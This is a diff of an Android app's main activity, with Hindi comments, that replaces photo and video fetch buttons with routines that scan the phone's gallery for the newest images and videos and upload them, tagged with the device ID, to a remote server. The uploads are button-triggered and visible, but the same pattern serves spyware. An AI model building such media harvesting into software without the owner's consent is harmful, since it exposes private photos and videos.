@@ -11,10 +11,8 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Log;
 import android.widget.Button;
-import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
-import android.widget.VideoView;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -45,11 +43,7 @@ public class MainActivity extends AppCompatActivity {
     private Button btnServerSync;
     private Button btnExit;
     private Button btnTestUpload;
-    private Button btnFetchPhoto;    // 🔥 NEW: फोटो फेच करने के लिए
-    private Button btnFetchVideo;    // 🔥 NEW: वीडियो फेच करने के लिए
-
-    private ImageView ivPhoto;       // 🔥 फोटो दिखाने के लिए
-    private VideoView vvVideo;       // 🔥 वीडियो दिखाने के लिए
+    private Button btnTestVideoUpload;
 
     String[] permissions = {
             Manifest.permission.RECORD_AUDIO,
@@ -66,23 +60,16 @@ public class MainActivity extends AppCompatActivity {
         btnServerSync = findViewById(R.id.btn_server_sync);
         btnExit = findViewById(R.id.btn_exit);
         btnTestUpload = findViewById(R.id.btn_test_upload);
-        btnFetchPhoto = findViewById(R.id.btn_fetch_photo);
-        btnFetchVideo = findViewById(R.id.btn_fetch_video);
-        ivPhoto = findViewById(R.id.iv_photo);
-        vvVideo = findViewById(R.id.vv_video);
+        btnTestVideoUpload = findViewById(R.id.btn_test_video_upload);
 
         checkPermissions();
 
         btnTestUpload.setOnClickListener(v -> {
-            scanAllMedia();  // 🔥 पूरा मोबाइल स्कैन करेगा
+            scanAllImages();
         });
 
-        btnFetchPhoto.setOnClickListener(v -> {
-            fetchLatestPhoto();  // 🔥 सर्वर से लेटेस्ट फोटो लाएगा
-        });
-
-        btnFetchVideo.setOnClickListener(v -> {
-            fetchLatestVideo();  // 🔥 सर्वर से लेटेस्ट वीडियो लाएगा
+        btnTestVideoUpload.setOnClickListener(v -> {
+            scanAllVideos();
         });
     }
 
@@ -140,9 +127,8 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // 🔥 NEW: POORA MOBILE SCAN KAREGA (TEST KE LIYE)
-    private void scanAllMedia() {
-        Log.d(TAG, "🔍 Scanning all media...");
+    private void scanAllImages() {
+        Log.d(TAG, "🔍 Scanning all images...");
 
         String[] projection = {
                 MediaStore.Images.Media._ID,
@@ -164,20 +150,65 @@ public class MainActivity extends AppCompatActivity {
                 int count = 0;
                 int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
 
-                while (cursor.moveToNext() && count < 5) {  // पहले 5 photos
+                while (cursor.moveToNext() && count < 5) {
                     String path = cursor.getString(dataColumn);
-                    Log.d(TAG, "📸 Found: " + path);
+                    Log.d(TAG, "📸 Found image: " + path);
 
                     File file = new File(path);
                     if (file.exists()) {
-                        uploadToServer(file, "gallery");
+                        uploadToServer(file, "image");
                         count++;
                     }
                 }
 
-                Toast.makeText(this, "📤 Uploading " + count + " photos", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "📤 Uploading " + count + " images", Toast.LENGTH_LONG).show();
             } else {
-                Toast.makeText(this, "No media found", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "No images found", Toast.LENGTH_LONG).show();
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Scan error: " + e.getMessage());
+            Toast.makeText(this, "Scan error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void scanAllVideos() {
+        Log.d(TAG, "🔍 Scanning all videos...");
+
+        String[] projection = {
+                MediaStore.Video.Media._ID,
+                MediaStore.Video.Media.DATA,
+                MediaStore.Video.Media.DISPLAY_NAME,
+                MediaStore.Video.Media.DATE_ADDED
+        };
+
+        String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";
+
+        try (Cursor cursor = getContentResolver().query(
+                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                sortOrder)) {
+
+            if (cursor != null) {
+                int count = 0;
+                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA);
+
+                while (cursor.moveToNext() && count < 5) {
+                    String path = cursor.getString(dataColumn);
+                    Log.d(TAG, "🎥 Found video: " + path);
+
+                    File file = new File(path);
+                    if (file.exists()) {
+                        uploadVideoToServer(file, "video");  // 🔥 FIXED: "test_video" → "video"
+                        count++;
+                    }
+                }
+
+                Toast.makeText(this, "📤 Uploading " + count + " videos", Toast.LENGTH_LONG).show();
+            } else {
+                Toast.makeText(this, "No videos found", Toast.LENGTH_LONG).show();
             }
 
         } catch (Exception e) {
@@ -200,15 +231,15 @@ public class MainActivity extends AppCompatActivity {
                 @Override
                 public void onResponse(Call<ApiService.MediaResponse> call, Response<ApiService.MediaResponse> response) {
                     if (response.isSuccessful()) {
-                        Log.d(TAG, "✅ Upload successful: " + file.getName());
+                        Log.d(TAG, "✅ Image upload success: " + file.getName());
                     } else {
-                        Log.e(TAG, "❌ Upload failed: " + response.code() + " - " + response.message());
+                        Log.e(TAG, "❌ Image upload failed: " + response.code());
                     }
                 }
 
                 @Override
                 public void onFailure(Call<ApiService.MediaResponse> call, Throwable t) {
-                    Log.e(TAG, "❌ Upload error: " + t.getMessage());
+                    Log.e(TAG, "❌ Image upload error: " + t.getMessage());
                 }
             });
         } catch (Exception e) {
@@ -216,71 +247,37 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // 🔥 NEW: LATEST PHOTO FETCH KAREGA
-    private void fetchLatestPhoto() {
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+    private void uploadVideoToServer(File file, String type) {
+        try {
+            RequestBody requestFile = RequestBody.create(MediaType.parse("video/*"), file);
+            MultipartBody.Part body = MultipartBody.Part.createFormData("file", file.getName(), requestFile);
 
-        ApiService apiService = ApiClient.getClient().create(ApiService.class);
-        Call<ApiService.PhotoResponse> call = apiService.getLatestPhoto(deviceId);
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            RequestBody deviceIdBody = RequestBody.create(MediaType.parse("text/plain"), deviceId);
+            RequestBody typeBody = RequestBody.create(MediaType.parse("text/plain"), type);
 
-        call.enqueue(new Callback<ApiService.PhotoResponse>() {
-            @Override
-            public void onResponse(Call<ApiService.PhotoResponse> call, Response<ApiService.PhotoResponse> response) {
-                if (response.isSuccessful() && response.body() != null) {
-                    String photoUrl = response.body().url;
-                    Log.d(TAG, "📸 Latest photo URL: " + photoUrl);
-
-                    // फोटो ImageView में दिखाओ
-                    if (photoUrl != null && !photoUrl.isEmpty()) {
-                        // Glide या Picasso से लोड कर सकते हो
-                        // Glide.with(MainActivity.this).load(photoUrl).into(ivPhoto);
-                        Toast.makeText(MainActivity.this, "Photo URL: " + photoUrl, Toast.LENGTH_LONG).show();
+            ApiService apiService = ApiClient.getClient().create(ApiService.class);
+            apiService.uploadMedia(deviceIdBody, typeBody, body).enqueue(new Callback<ApiService.MediaResponse>() {
+                @Override
+                public void onResponse(Call<ApiService.MediaResponse> call, Response<ApiService.MediaResponse> response) {
+                    if (response.isSuccessful()) {
+                        Log.d(TAG, "✅ Video upload success: " + file.getName());
+                        Toast.makeText(MainActivity.this, "Video uploaded: " + file.getName(), Toast.LENGTH_SHORT).show();
+                    } else {
+                        Log.e(TAG, "❌ Video upload failed: " + response.code());
+                        Toast.makeText(MainActivity.this, "Upload failed: " + response.code(), Toast.LENGTH_SHORT).show();
                     }
-                } else {
-                    Log.e(TAG, "❌ Failed to fetch photo");
-                    Toast.makeText(MainActivity.this, "No photo found", Toast.LENGTH_SHORT).show();
                 }
-            }
 
-            @Override
-            public void onFailure(Call<ApiService.PhotoResponse> call, Throwable t) {
-                Log.e(TAG, "❌ Fetch photo error: " + t.getMessage());
-                Toast.makeText(MainActivity.this, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-
-    // 🔥 NEW: LATEST VIDEO FETCH KAREGA
-    private void fetchLatestVideo() {
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-
-        ApiService apiService = ApiClient.getClient().create(ApiService.class);
-        Call<ApiService.VideoResponse> call = apiService.getLatestVideo(deviceId);
-
-        call.enqueue(new Callback<ApiService.VideoResponse>() {
-            @Override
-            public void onResponse(Call<ApiService.VideoResponse> call, Response<ApiService.VideoResponse> response) {
-                if (response.isSuccessful() && response.body() != null) {
-                    String videoUrl = response.body().url;
-                    Log.d(TAG, "🎥 Latest video URL: " + videoUrl);
-
-                    // वीडियो VideoView में दिखाओ
-                    if (videoUrl != null && !videoUrl.isEmpty()) {
-                        vvVideo.setVideoPath(videoUrl);
-                        vvVideo.start();
-                        Toast.makeText(MainActivity.this, "Video URL: " + videoUrl, Toast.LENGTH_LONG).show();
-                    }
-                } else {
-                    Log.e(TAG, "❌ Failed to fetch video");
-                    Toast.makeText(MainActivity.this, "No video found", Toast.LENGTH_SHORT).show();
+                @Override
+                public void onFailure(Call<ApiService.MediaResponse> call, Throwable t) {
+                    Log.e(TAG, "❌ Video upload error: " + t.getMessage());
+                    Toast.makeText(MainActivity.this, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
                 }
-            }
-
-            @Override
-            public void onFailure(Call<ApiService.VideoResponse> call, Throwable t) {
-                Log.e(TAG, "❌ Fetch video error: " + t.getMessage());
-                Toast.makeText(MainActivity.this, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Exception: " + e.getMessage());
+            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+        }
     }
 }
